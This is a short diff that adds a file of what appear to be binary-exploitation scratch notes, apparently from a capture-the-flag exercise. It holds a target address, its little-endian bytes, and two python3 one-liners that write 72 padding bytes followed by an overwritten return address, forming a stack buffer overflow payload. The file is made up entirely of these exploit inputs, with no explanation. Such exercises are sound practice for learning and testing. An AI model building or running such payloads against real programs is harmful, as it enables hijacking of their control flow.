@@ -1,0 +1,7 @@
+4012da
+\xda\x12\x40
+
+python3 -c 'import sys; sys.stdout.buffer.write(b"A" * 72 + b"\x4e\x12\x40\x00\x00")'
+python3 -c 'import sys; sys.stdout.buffer.write(b"A" * 72 + b"\xda\x12\x40\x00\x00")'
+
+
